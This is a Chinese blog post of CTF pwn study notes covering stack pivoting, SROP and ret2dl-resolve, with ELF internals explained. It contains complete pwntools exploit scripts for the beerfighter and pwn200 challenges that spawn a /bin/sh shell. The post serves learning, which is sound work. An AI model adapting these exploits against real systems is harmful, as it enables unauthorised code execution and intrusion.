class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0804882C</span></span><br><span class="line">xchg_eax_esp = <span class="number">0x804882E</span></span><br><span class="line">mov_eax_eax = <span class="number">0x8048830</span></span><br><span class="line">add_eax_ebx = <span class="number">0x08048833</span></span><br><span class="line">leave_ret = <span class="number">0x080485f5</span></span><br><span class="line">pop_ebx = <span class="number">0x080484a9</span></span><br><span class="line">call_eax=  <span class="number">0x080485f0</span></span><br><span class="line"></span><br><span class="line">foothold_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_got = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">offset = lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>] - lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;pivot: &#x27;</span>)</span><br><span class="line">leakaddress = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">leakaddress = <span class="built_in">int</span>(leakaddress.decode(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leakaddress: 0x%x&quot;</span> % leakaddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step1</span>():</span></span><br><span class="line">    payload = p32(foothold_plt)</span><br><span class="line">    payload += p32(pop_eax)</span><br><span class="line">    payload += p32(foothold_got)</span><br><span class="line">    payload += p32(mov_eax_eax)</span><br><span class="line">    payload += p32(pop_ebx)</span><br><span class="line">    payload += p32(offset)</span><br><span class="line">    payload += p32(add_eax_ebx)</span><br><span class="line">    payload += p32(call_eax)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step2</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">    payload += p32(leakaddress - <span class="number">4</span>) <span class="comment"># pop ebp</span></span><br><span class="line">    payload += p32(leave_ret)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    step1()</span><br><span class="line">    step2()</span><br><span class="line">    io.recvall()</span><br></pre></td></tr></table></figure>

<h3 id="GreHack-CTF2017-beerfighter"><a href="#GreHack-CTF2017-beerfighter" class="headerlink" title="GreHack CTF2017: beerfighter"></a>GreHack CTF2017: beerfighter</h3><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220404121206279.png" class="" title="image-20220404121206279">

<p>IDA打开分析，发现在这个地方存在溢出，程序中存在syscall，所以采用srop的技术，然后由于我们最终调用syscall，是把rax设置为SYS_execve，然后rdi是/bin/sh，所以我们还需要提前调用read，即syscall,rax为SYS_read，把 /bin/sh写入进去，写入到.data段，下面是EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;beerfighter&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;beerfighter&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x00400764</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">data_address = elf.get_section_by_name(<span class="string">&quot;.data&quot;</span>).header.sh_addr + <span class="number">0x10</span>       <span class="comment"># /bin/sh</span></span><br><span class="line">base_address = data_address + <span class="number">8</span>                                 <span class="comment"># new stack</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x040077a</span></span><br><span class="line">sigret_bytes = p64(pop_rax) + p64(constants.SYS_rt_sigreturn)+p64(syscall_addr)      <span class="comment"># 0xf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rax = constants.SYS_execve</span><br><span class="line">frame2.rdi = data_address      </span><br><span class="line">frame2.rsi = <span class="number">0</span>      </span><br><span class="line">frame2.rdx = <span class="number">0</span>       </span><br><span class="line">frame2.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_read</span><br><span class="line">frame1.rdi = constants.STDIN_FILENO      </span><br><span class="line">frame1.rsi = data_address      </span><br><span class="line">frame1.rdx = <span class="built_in">len</span>(<span class="built_in">bytes</span>(frame2)) + <span class="number">32</span></span><br><span class="line">frame1.rsp = base_address       <span class="comment"># new stack		# 可以采用这种方式进行stack pivot</span></span><br><span class="line">frame1.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_1</span>():</span></span><br><span class="line">    payload1 = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">1040</span> + <span class="number">8</span>)</span><br><span class="line">    payload1 += sigret_bytes</span><br><span class="line">    payload1 += <span class="built_in">bytes</span>(frame1)</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, payload1)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_2</span>():</span></span><br><span class="line">    payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload2 += sigret_bytes</span><br><span class="line">    payload2 += <span class="built_in">bytes</span>(frame2)</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    step_1()</span><br><span class="line">    step_2()</span><br></pre></td></tr></table></figure>

<h2 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h2><p>现代漏洞利用通常包含两个阶段</p>
<ol>
<li>第一步先通过信息泄露获得程序的内存布局</li>
<li>第二部才进行实际的漏洞利用</li>
</ol>
<p>然而从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是就有了ret2dl-resolve，巧妙的利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露，就可以直接标识关键函数的位置并调用。( 我感觉这个ret2dl-resolve有点类似于windows下的那个GetProcAddress函数，就是动态获取函数的地址。。</p>
<h3 id="ret2dl-resolve原理"><a href="#ret2dl-resolve原理" class="headerlink" title="ret2dl-resolve原理"></a>ret2dl-resolve原理</h3><p>动态装载器负责将二进制文件及依赖库加载到内存，该过程包含了对导入符号（函数和全局变量）的解析。</p>
<p>每个符号都是Elf_Sym结构体，这些符号又共同组成了.dynsym段, Elf32_Sym的结构体如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;         /<span class="number">4</span>字节* <span class="function">Symbol <span class="title">name</span> <span class="params">(string tbl index)</span> */ 相对于.dynstr段的偏移</span></span><br><span class="line"><span class="function">  Elf32_Addr    st_value</span>;        /<span class="number">4</span>字节* Symbol value */		导出函数的地址，不导出时为<span class="literal">NULL</span></span><br><span class="line">  Elf32_Word    st_size;         /<span class="number">4</span>字节* Symbol size */</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>    st_info;      /<span class="number">1</span>字节* Symbol type <span class="keyword">and</span> binding */		</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>    st_other;     /<span class="number">1</span>字节* Symbol visibility */</span><br><span class="line">  Elf32_Section    st_shndx;     /<span class="number">2</span>字节* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>对于st_info段</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br></pre></td></tr></table></figure>

<p>对于pwn来说，只考虑st_name, st_info即可</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">st_name = 被调用函数名字符串地址相对于.dynstr段的偏移</span><br><span class="line">st_info = (<span class="number">0x1</span> &lt;&lt; <span class="number">4</span>) + <span class="number">0x2</span> <span class="comment">// (STB_GLOBAL &lt;&lt; 4) + STT_FUNC</span></span><br><span class="line"><span class="comment">// 如果要绑定函数 st_info = 0x12 例如:__libc_start_main</span></span><br><span class="line"><span class="comment">// 如果要绑定一般的指针 st_info = 0x11 例如:stdin</span></span><br><span class="line"><span class="comment">// 如果要绑定变量 st_info = 0x20 例如:__gmon_start__</span></span><br></pre></td></tr></table></figure>

<p>在IDA中看到的.dynsym和.dynstr如下</p>
<img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407201304838.png" class="" title="image-20220407201304838">

<p>导入符号的解析需要重定位，每个重定位项都是Elf_Rel结构体的实例，这些项又共同组成了.rel.plt段（用于导入函数）和.rel.dyn段（用于导入全局变量）。Elf_Rel的结构如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;        /<span class="number">4</span>字节* Address */	</span><br><span class="line">  Elf32_Word    r_info;          /<span class="number">4</span>字节* Relocation type <span class="keyword">and</span> symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p>对于r_offset项，是GOT表对应项的地址，r_info的高位3个字节用于标识该符号在.dymsym段的位置，即无符号下标，低1个字节是type，如果是6则是变量，为7则为函数，在IDA中看到的.rel.plt和.rel.dyn如图</p>
<img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407203119482.png" class="" title="image-20220407203119482">

<p>_dl_runtime_resolve()函数有2个参数，第一个参数是link_map对象的地址，第二个参数是导入函数的标识（Elf_Rel在.rel.plt段中的偏移），函数参数link_map_obj用于获取解析导入函数所需的信息，参数reloc_index标识了解析哪一个导入函数。</p>
<p>符号解析过程如图所示,这里要注意下32位和64位程序结构体会有所区别，而且这个.dl_runtime_resolve的第二个参数，对于32位程序是Elf_Rel在.rel.plt的偏移，对于64位程序是对应Elf_Rel在.rel.plt的索引</p>
<img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407205805778.png" class="" title="image-20220407205805778">

<h3 id="2种攻击场景"><a href="#2种攻击场景" class="headerlink" title="2种攻击场景"></a>2种攻击场景</h3><p>RELRO保护机制会影响延迟绑定，因此也会影响retdl_resolve:</p>
<ul>
<li>Partial RELRO: 包括.dynamic段在内的一些段会被标识为只读</li>
<li>Full RELRO: 在Partial RELRO的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，.got.plt段被完全初始化为目标函数的地址，并标记为只读</li>
</ul>
<p>下面来看2个简单的攻击场景</p>
<ol>
<li>关闭RELRO，.dynamic可写，因为动态装载器是通过.dynamic段的DT_STRTAB条目来获取.dynstr段的地址，所以我们可以修改DT_STRTAB来使其指向一个伪造的.dynstr段，在那里伪造假的字符串，这样在执行printf的时候，可以执行execve</li>
</ol>
<img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407210853008.png" class="" title="image-20220407210853008">

<ol start="2">
<li>开启Partial RELRO保护，使.dynamic段不可写，我们知道_dl_runtime_resolve的第二个参数是对应Elf_Rel相对.rel.plt的偏移，当这个数字非常大的时候，会超出.rel.plt段，我们使其正好落在.bss段，在那里伪造一个Elf_Rel，使r_offset的值指向一个可写的内存地址（用于保存解析后的地址），构造r_info。使其指向一个位于它后面的Elf_Sym，然后Elf_Sym中的st_name指向它后面的函数名字符串</li>
</ol>
<img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407211218286.png" class="" title="image-20220407211218286">



<h3 id="XDCTF-2015-pwn200"><a href="#XDCTF-2015-pwn200" class="headerlink" title="XDCTF 2015:  pwn200"></a>XDCTF 2015:  pwn200</h3><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220411100012776.png" class="" title="image-20220411100012776">

<p>IDA打开分析，在这个位置存在栈溢出漏洞，思路是在这个地方利用stack pivot将栈转移到bss段，然后在.bss段伪造Elf_Rel，Elf_Sym和函数名</p>
<p>EXP为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;pwn200&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;pwn200&quot;</span>)</span><br><span class="line">io.recvline(<span class="string">&quot;2015~!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pppr_addr = <span class="number">0x080485cd</span></span><br><span class="line">pop_ebp_addr = <span class="number">0x08048453</span></span><br><span class="line">leave_ret_addr = <span class="number">0x08048481</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr = elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_pivot</span>():</span></span><br><span class="line">    payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>       <span class="comment"># buf</span></span><br><span class="line">    payload1 += p32(read_plt)   <span class="comment"># return address</span></span><br><span class="line">    payload1 += p32(pppr_addr)</span><br><span class="line">    payload1 += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">200</span>)</span><br><span class="line">    payload1 += p32(pop_ebp_addr) + p32(bss_addr) <span class="comment"># ebp</span></span><br><span class="line">    payload1 += p32(leave_ret_addr)</span><br><span class="line">    </span><br><span class="line">    io.send(payload1)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    r_sym = (bss_addr + <span class="number">40</span> - dynsym) // <span class="number">0x10</span></span><br><span class="line">    r_type = <span class="number">0x7</span></span><br><span class="line">    r_info = (r_sym &lt;&lt; <span class="number">8</span>) + (r_type &amp; <span class="number">0xff</span>)</span><br><span class="line">    fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">    st_name = bss_addr + <span class="number">56</span> - dynstr        <span class="comment">#&#x27;system\x00\x00&#x27; addr</span></span><br><span class="line">    st_bind = <span class="number">0x1</span></span><br><span class="line">    st_type = <span class="number">0x2</span></span><br><span class="line">    st_info = (st_bind &lt;&lt; <span class="number">4</span>) + (st_type &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(st_info)</span><br><span class="line"></span><br><span class="line">    reloc_index = bss_addr + <span class="number">28</span> - rel_plt	<span class="comment"># offset</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b&#x27;AAAA&#x27;</span> <span class="comment"># ebp</span></span><br><span class="line">    payload2 += p32(plt_0)</span><br><span class="line">    payload2 += p32(reloc_index)        <span class="comment"># call system</span></span><br><span class="line">    payload2 += <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    payload2 += p32(bss_addr + <span class="number">80</span>)		<span class="comment"># 参数/bin/sh的位置</span></span><br><span class="line">    payload2 += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">    payload2 += fake_reloc</span><br><span class="line">    payload2 += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>            <span class="comment"># 到此 payload2为 40 bytes</span></span><br><span class="line"></span><br><span class="line">    payload2 += fake_sym        <span class="comment"># 到此 payload2为 56 bytes</span></span><br><span class="line">    payload2 += <span class="string">b&quot;system\x00\x00&quot;</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">80</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    payload2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">100</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.sendline(payload2)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    stack_pivot()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<p>注意！：<code>bss_addr = elf.get_section_by_name(&#39;.bss&#39;).header.sh_addr + 0x800</code> 这个地方卡了好久，要+0x800左右的数据才能跑通，加的少了估计会有其他函数也用到这个内存的数据，会冲突，导致跑不通</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">zsky</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zzzzsky.github.io/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/">https://zzzzsky.github.io/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zzzzsky.github.io" target="_blank">zsky's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a><a class="post-meta__tags" href="/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/">《CTF竞赛权威指南-pwn篇》</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?zhanyichuyurop" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/"><img class="prev-cover" src="https://www.dmoe.cc/random.php?starctf2022" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022* CTF部分RE题目WP</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/10/2022_miniL%E5%87%BA%E9%A2%98RE-zsky/"><img class="next-cover" src="https://www.dmoe.cc/random.php?minil2022re" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022miniLctf_RE出题_twin</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/" title="第2章_二进制文件"><img class="cover" src="https://www.dmoe.cc/random.php?di2zhang2jinzhiwenjian" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">第2章_二进制文件</div></div></a></div><div><a href="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="第4章_Linux安全机制"><img class="cover" src="https://www.dmoe.cc/random.php?linuxanquanjizhi" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-22</div><div class="title">第4章_Linux安全机制</div></div></a></div><div><a href="/2022/03/24/%E7%AC%AC8%E7%AB%A0_%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" title="第8章_整数安全"><img class="cover" src="https://www.dmoe.cc/random.php?zhengshuanquan" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-24</div><div class="title">第8章_整数安全</div></div></a></div><div><a href="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="第9章_格式化字符串"><img class="cover" src="https://api.ixiaowai.cn/api/api.php?zhengshuanquan" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-27</div><div class="title">第9章_格式化字符串</div></div></a></div><div><a href="/2022/04/01/pwn%E5%88%B7%E9%A2%981/" title="攻防世界PWN刷题1"><img class="cover" src="https://www.dmoe.cc/random.php?gongfangshuati111" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-01</div><div class="title">攻防世界PWN刷题1</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">栈溢出原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">危险函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">返回导向编程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-ROP"><span class="toc-number">3.</span> <span class="toc-text">Blind ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BROP%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">BROP原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2016-brop"><span class="toc-number">3.2.</span> <span class="toc-text">HCTF 2016: brop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SROP"><span class="toc-number">4.</span> <span class="toc-text">SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">SROP原理</span></a><ol 